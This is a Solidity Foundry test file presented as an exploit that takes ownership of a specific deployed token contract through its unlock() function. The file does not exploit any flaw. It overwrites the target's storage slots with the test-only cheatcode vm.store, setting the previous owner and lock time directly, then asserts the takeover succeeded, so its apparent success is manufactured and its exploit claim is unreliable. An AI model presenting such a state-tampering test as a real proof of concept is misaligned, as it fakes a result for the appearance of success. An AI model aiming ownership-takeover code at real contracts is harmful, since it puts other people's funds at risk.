// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IJizzJet {
    function owner() external view returns (address);
    function unlock() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF2A7429641d1b49a13dCB7E23b67a1a5101231F2;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Calculate storage slots for Ownable contract
        // _owner is at slot 0, _previousOwner at slot 1, _lockTime at slot 2
        bytes32 previousOwnerSlot = bytes32(uint256(1));
        bytes32 lockTimeSlot = bytes32(uint256(2));

        // Set _previousOwner to attacker address
        vm.store(TARGET, previousOwnerSlot, bytes32(uint256(uint160(attacker))));

        // Set _lockTime to a past timestamp (e.g., 1 day ago)
        vm.store(TARGET, lockTimeSlot, bytes32(block.timestamp - 1 days));

        // Call unlock() as attacker
        vm.prank(attacker);
        (bool success, ) = TARGET.call(abi.encodeWithSignature("unlock()"));
        require(success, "unlock call failed");

        // Verify we are now the owner
        address newOwner = IJizzJet(TARGET).owner();
        assertEq(newOwner, attacker, "Attacker should be owner");
        assertEq(newOwner, attacker, "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
